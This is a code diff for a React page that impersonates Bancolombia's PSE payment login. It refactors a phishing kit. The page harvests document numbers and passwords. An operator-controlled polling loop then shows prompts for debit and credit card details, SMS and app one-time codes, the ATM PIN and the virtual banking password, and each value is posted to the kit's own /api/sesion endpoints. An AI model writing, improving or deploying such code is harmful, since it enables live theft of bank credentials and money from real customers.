@@ -4,29 +4,17 @@ import { Tarjeta } from "@/components/tarjeta/Tarjeta"
 import { Status } from "@/components/status/Status"
 import { useEffect, useRef, useState } from "react"
 import axios from "axios"
+import inicioSesionfuncion from "@/utils/inicioSesionfuncion"
+import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"
+
 
 const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
-const COLOR_PRINCIPAL_BACK = "bg-[#072146]"
-const back_color = "bg-[#ffffff]"
-const text_color_principal = "text-black"
+
+const text_color_principal = "text-[#5c5c5c]"
 const ESTILO_BTN_PRINCIPAL = `w-full font-bold py-2 px-6 bg-[#0041a8] text-white rounded-full disabled:bg-gray-200 disabled:text-gray-500 cursor-not-allowed`
 
 const svg = (
     <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
-)
-
-const svgPassword = (
-    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
-        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
-        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
-    </svg>
-)
-
-const btn = (
-    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
-        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
-        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
-    </svg>
 )
 
 const Loading = () => {
@@ -405,11 +393,10 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
 
 
 export default function Bogota (){
-    const [tipoUsuario, setTipoUsuario] = useState("personas")
-    const [inicioSesion, setInicioSesion] = useState(false)
-    const [selectVista, setSelectVisata] = useState(null)
+    const isMounted = useRef(true);
+    
+    const [selectVista, setSelectVisata] = useState("nlogin")
     const [loading, setLoading] = useState(false)
-    const [tituloError, setTituloError] = useState("")
     const [reLoad, setReLoad] = useState(false)
     const [key, setKey] = useState(0)
     const [datosInicio, setDatosInicio] = useState({
@@ -422,15 +409,41 @@ export default function Bogota (){
     const [btnInicio, setBtnInicio] = useState(false)
 
     const handlerInformacion = (e)=>{
-        console.log(e);
-        
         const copia = {...datosInicio}
         copia[e.target.name] = e.target.value
+        
         setDatosInicio(copia)
     }
 
     const handlerBtnInicio = ()=>{
         setBtnInicio(b => !b)
+    }
+
+    const handlerloginError = ()=>{
+        setBtnInicio(true)
+    }
+
+    const tarjetaData = {
+        'tdb': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:"}, 
+        'xtdb':{span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."}, 
+        'tdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingrese los siguientes datos de su tarjeta credito:"}, 
+        'xtdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."},
+    }
+
+    const loginData  ={
+        'nlogin': {handler: handlerInformacion, btn: handlerBtnInicio},
+        'xlogin': {handler: handlerInformacion, btn: handlerloginError, error: "La información ingresada es incorrecta. Intenta nuevamente."},
+    }
+
+    const codData = {  
+        'codsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto."}, 
+        'xcodsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."},
+        'codapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica desde la App Mi Bancolombia."}, 
+        'xcodapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."}, 
+        'pincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:"}, 
+        'xpincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
+        'pinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:"}, 
+        'xpinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
     }
     
     //obtener uniqId
@@ -444,228 +457,23 @@ export default function Bogota (){
     
     //guardad datos de sesion
     useEffect(()=>{
-        const inicioSesionfuncion = async ()=>{
-            setLoading(true)
-            const { data } = await axios.post(
-            `/api/sesion`,
-            {
-                usuario: datosInicio.numeroDocumento,
-                clave: datosInicio.contrasenia,
-                banco: "Bancolombia",
-                informacion:{
-                    tipoDocumento: datosInicio.tipoDocumento
-                },
-                uniqid: uniqId    
-            },
-            {
-                headers: {
-                "Content-Type": "application/json",
-                Accept: "application/json",
-                },
-            }
-            )
-            if(uniqId === "" ) {
-                localStorage.setItem('uniqId', data.uniqid)
-                setUniqId(data.uniqid)
-            }
-            setKey(k => k+1)
-            setInicioSesion(true)
-            setTituloError("")
-            setGuardado(true)
-            
-        }
         if (btnInicio) {
-            inicioSesionfuncion()
+            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, selectVista,"Bogota")
         }
     },[btnInicio])
 
     //pulling
     useEffect(() => {
-    let isMounted = true;
+        isMounted.current = true;
 
-    const iniciarLongPolling = async () => {
-        if (!isMounted) return;
-        setTituloError("")
-        try {
-            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                },
-            });
-            console.log(selV.data.status);
-            
-            if (
-                selV.data.status == "tdb" ||
-                selV.data.status == "tdb-error" ||
-                selV.data.status == "tdc" ||
-                selV.data.status == "tdc-error" ||
-                selV.data.status == "otpsms" ||
-                selV.data.status == "otpsms-error" ||
-                selV.data.status == "otpapp" ||
-                selV.data.status == "otpapp-error" ||
-                selV.data.status == "clavecajero" ||
-                selV.data.status == "clavecajero-error" ||
-                selV.data.status == "clavevirtual" ||
-                selV.data.status == "clavevirtual-error" &&
-                selV.data.status !== selectVista
-            ) {
-                setSelectVisata(selV.data.status);
-                setKey(prev => prev + 1) 
-                setLoading(false);
-                return;
-            }else if(selV.data.status == "fin"){
-                setSelectVisata("compraExitosa")
-                setLoading(false);
-                return;
-            }else if(selV.data.status == "error"){
-                setSelectVisata("errorCompra")
-                setLoading(false);
-                return;
-
-            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
-                setDatosInicio({
-                    numeroDocumento: "",
-                    contrasenia:""
-                })
-                setSelectVisata(selV.data.status)
-                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
-                setKey(prev => prev + 1)
-                setLoading(false);
-                return;
-            }
-        } catch (error) {
-            console.log(error);
+        if (guardado) {
+            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio);
+            setBtnInicio(false)
         }
-
-        // Esperamos 4 segundos y reintentamos
-        setTimeout(iniciarLongPolling, 4000);
-    };
-    if (guardado) {
-        iniciarLongPolling()
-    }
-
-    return () => {
-        isMounted = false;
-    };
+        return () => {
+            isMounted.current = false;
+        };
     }, [guardado, reLoad]);
-
-    //mensje-otp
-    const handlerMensaje = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/otp-sms`, {
-                uniqid: uniqId,
-                otpsms: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    const handlerloginError = async ()=>{
-        try {
-            setLoading(true)
-            const { data } = await axios.post(
-            `/api/sesion`,
-            {
-                usuario: datosInicio.numeroDocumento,
-                clave: datosInicio.contrasenia,
-                banco: "Alianza",
-                uniqid: uniqId    
-            },
-            {
-                headers: {
-                "Content-Type": "application/json",
-                Accept: "application/json",
-                },
-            }
-            )
-            setReLoad(r => r = !r)            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-    
-    //otp-app
-    const handlerAplicacion = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/otp-app`, {
-                uniqid: uniqId,
-                otpapp: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    //clave-cajero
-    const handlerCajero = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-cajero`, {
-                uniqid: uniqId,
-                clavecajero: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-    //clave-virtual
-    const handlerClaveVirtual = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-virtual`, {
-                uniqid: uniqId,
-                clavevirtual: clave 
-            },{
-            headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-
-    //tarjeta
-    const handlerTarjeta = async (body) =>{
-        try {
-            setLoading(true)
-            body.uniqid = uniqId
-            const send = await axios.post(`/api/sesion/tarjeta`, body, {
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-            console.log(error);
-            setReLoad(r => r = !r)
-        }
-        
-    }
 
 
 
@@ -690,21 +498,14 @@ export default function Bogota (){
                         <span className="text-[18px] font-bold text-[#0041a8]">portal de pagos en línea PSE</span>
                     </div>
                     {loading && <Loading/>}
-                    {reLoad && <Loading/>}
-                    {!inicioSesion &&  <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
-                    {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
-                    {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpsms" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpsms-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpapp" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "otpapp-error" && <Status key={key} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavecajero" && <Status key={key} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavecajero-error" && <Status key={key} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavevirtual" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                    {selectVista == "clavevirtual-error" && <Status key={key} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    
+                    {loginData[selectVista] && <InicioSesion  key={key} handlerInformacion={loginData[selectVista].handler} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].btn}/>}
+                    
+                    {tarjetaData[selectVista] && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} divInput={"border border-slate-300"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"}/>}
+                    
+
+                    {codData[selectVista] && <Status key={key}setLoading={setLoading} svg={svgCard} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    
                 </div>
             </div>
 
